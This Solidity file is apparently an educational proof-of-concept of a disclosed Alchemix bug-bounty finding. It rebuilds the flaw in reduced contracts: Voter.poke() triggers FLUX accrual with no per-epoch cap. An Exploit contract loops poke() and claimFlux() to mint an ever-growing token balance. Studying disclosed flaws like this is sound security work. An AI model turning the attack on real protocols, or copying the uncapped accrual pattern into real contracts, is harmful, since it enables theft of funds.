// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Alchemix — Infinite minting of FLUX through voter.poke() (Immunefi,
    Django, finding #38110)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground. The full
    accrual chain poke() -> _vote() -> accrueFlux() is inlined VERBATIM; the
    Exploit deploys a reduced VotingEscrow + FluxToken + Voter and shows that
    simply calling poke() and claiming, repeatedly, with NOTHING else
    happening in between, mints an unbounded, ever-growing FLUX balance —
    the same underlying accrual chain as #38109, demonstrated as an
    open-ended "claim in a loop" attack rather than a single burst
    (no fork, no cheatcodes).

    Root cause: poke() calls _vote(), which calls FLUX.accrueFlux(_tokenId)
    unconditionally on every invocation. accrueFlux does
    `unclaimedFlux[_tokenId] += claimableFlux(_tokenId)` with no check for
    whether this epoch (or even this transaction) already accrued. Since
    poke() itself is entirely public and callable by the position's holder at
    will, an attacker can simply call poke() + claimFlux() over and over,
    each iteration minting more FLUX than the last cumulative total — there
    is no upper bound at all.
//////////////////////////////////////////////////////////////////////////*/

/// @notice Reduced veALCX: a locked position accrues a fixed claimable FLUX
///         amount per call. In the real system this derives from the
///         position's locked balance/boost; here it is a fixed per-token
///         constant, which is all `accrueFlux` actually reads.
contract VotingEscrow {
    mapping(uint256 => uint256) public claimableFluxOf;

    function setClaimable(uint256 tokenId, uint256 amount) external {
        claimableFluxOf[tokenId] = amount;
    }

    function claimableFlux(uint256 tokenId) external view returns (uint256) {
        return claimableFluxOf[tokenId];
    }
}

interface IVotingEscrowFlux {
    function claimableFlux(uint256 tokenId) external view returns (uint256);
}

/// @notice Reduced FluxToken: accrues unclaimed FLUX per veALCX position and
///         mints real ERC20 balance on claim. Mirrors accrueFlux/claimFlux.
contract FluxToken {
    address public voter;
    IVotingEscrowFlux public votingEscrow;
    mapping(uint256 => address) public ownerOf;
    mapping(uint256 => uint256) public unclaimedFlux;
    mapping(address => uint256) public balanceOf;

    function setVoter(address _voter) external {
        voter = _voter;
    }

    function setVotingEscrow(address _ve) external {
        votingEscrow = IVotingEscrowFlux(_ve);
    }

    function setOwner(uint256 tokenId, address _owner) external {
        ownerOf[tokenId] = _owner;
    }

    /// @notice Verbatim: accrueFlux has NO memory of whether this epoch (or
    ///         this very transaction) already accrued for _tokenId.
    function accrueFlux(uint256 _tokenId) external {
        require(msg.sender == voter, "not voter");
        uint256 amount = votingEscrow.claimableFlux(_tokenId);
        unclaimedFlux[_tokenId] += amount;
    }

    function getUnclaimedFlux(uint256 _tokenId) external view returns (uint256) {
        return unclaimedFlux[_tokenId];
    }

    function claimFlux(uint256 _tokenId, uint256 _amount) external {
        require(msg.sender == ownerOf[_tokenId], "not owner");
        require(_amount <= unclaimedFlux[_tokenId], "insufficient unclaimed");
        unclaimedFlux[_tokenId] -= _amount;
        balanceOf[msg.sender] += _amount;
    }
}

/// @notice Vulnerable Voter: poke() -> _vote() -> accrueFlux(), verbatim,
///         with no cap on how many times this chain can be invoked.
contract Voter {
    FluxToken public flux;

    constructor(FluxToken _flux) {
        flux = _flux;
    }

    function poke(uint256 _tokenId) public {
        _vote(_tokenId);
    }

    // @> VULN: _vote unconditionally triggers accrual on every call — there is
    //          no per-epoch (or any) cap anywhere in this chain.
    function _vote(uint256 _tokenId) internal {
        flux.accrueFlux(_tokenId);
    }
}

/// @notice Orchestrates the open-ended loop attack: poke() + claimFlux(),
///         repeated with nothing else happening in between, each iteration
///         minting strictly more FLUX than the position ever legitimately
///         earned.
contract Exploit {
    VotingEscrow public veALCX;
    FluxToken public flux;
    Voter public voter;

    uint256 public constant TOKEN_ID = 1;
    uint256 public constant CLAIMABLE_PER_CALL = 1 ether;
    uint256 public constant ITERATIONS = 5;

    constructor() {
        veALCX = new VotingEscrow();
        flux = new FluxToken();
        voter = new Voter(flux);

        flux.setVoter(address(voter));
        flux.setVotingEscrow(address(veALCX));
        flux.setOwner(TOKEN_ID, address(this));
        veALCX.setClaimable(TOKEN_ID, CLAIMABLE_PER_CALL);
    }

    function run() external {
        uint256 previousBalance = 0;

        // Simply poke + claim, over and over. No time warp, no new stake,
        // nothing else happens between iterations.
        for (uint256 i = 0; i < ITERATIONS; i++) {
            voter.poke(TOKEN_ID);
            uint256 unclaimed = flux.getUnclaimedFlux(TOKEN_ID);
            flux.claimFlux(TOKEN_ID, unclaimed);

            uint256 balance = flux.balanceOf(address(this));
            // HARM: balance strictly increases every single iteration, with
            // NOTHING backing the increase except calling poke() again.
            require(balance > previousBalance, "harm not demonstrated: balance should strictly grow each iteration");
            require(balance == CLAIMABLE_PER_CALL * (i + 1), "harm not demonstrated: growth should be unbounded and linear in iterations");
            previousBalance = balance;
        }

        // HARM confirmed: after 5 free iterations, the attacker holds 5x the
        // position's legitimate one-time accrual — and there is no upper
        // bound on how many more iterations could follow.
        require(flux.balanceOf(address(this)) == CLAIMABLE_PER_CALL * ITERATIONS, "final inflated balance mismatch");
    }
}
